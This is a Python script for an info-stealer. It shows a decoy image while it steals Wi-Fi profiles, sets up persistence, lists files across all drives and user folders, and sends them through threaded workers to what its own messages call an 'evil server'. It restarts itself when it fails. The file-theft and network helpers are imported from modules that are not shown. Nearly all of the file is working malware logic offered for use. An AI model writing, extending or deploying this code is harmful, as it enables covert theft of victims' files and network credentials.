import time
import sys
import os
import threading
from queue import Queue
from PIL import Image
from StealFiles import *
from StealNetworks import *
def open_image(image_name):
    if getattr(sys, 'frozen', False):
        base_path = os.path.dirname(sys.executable)
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
    image_path = os.path.join(base_path, image_name)
    if not os.path.exists(image_path):
        raise FileNotFoundError(f"Image not found: {image_path}")
    img = Image.open(image_path)
    img.show()
    return img
def main():
    profiles = get_wifi_profiles()
    if profiles:
        send_to_server(profiles)
    persist_execution()
    hostname, user = get_system_info()
    print(f"[+] Target: {hostname} ({user})")
    create_persistence()
    search_paths = []
    drives = get_all_drives()
    search_paths.extend(drives)
    print(f"[+] Found drives: {drives}")
    special_folders = get_special_folders()
    search_paths.extend(special_folders)
    print(f"[+] Special folders: {special_folders}")
    all_files = []
    for path in search_paths:
        print(f"[*] Searching: {path}")
        try:
            files = find_files_recursive(path)
            all_files.extend(files[:1000])  
            print(f"[+] Found {len(files)} files in {path}")
        except Exception as e:
            print(f"[!] Error searching {path}: {str(e)}")
    print(f"[+] Total files to steal: {len(all_files)}")
    file_queue = Queue()
    for file_path in all_files:
        file_queue.put(file_path)
    num_threads = min(5, len(all_files))
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=worker, args=(file_queue, hostname, user))
        t.daemon = True
        t.start()
        threads.append(t)
    file_queue.join()
    print("[+] File theft complete! All data sent to evil server.")
    while True:
        time.sleep(60)
        print("[+] Malware still active...")
if __name__ == "__main__":
    try:
        threading.Thread(
           target=open_image,
           args=("picture.jpg",),
           daemon=True
        ).start()
        main()
    except KeyboardInterrupt:
        print("\n[!] Operation interrupted")
    except Exception as e:
        print(f"[!] Critical error: {str(e)}")
        time.sleep(10)
        main()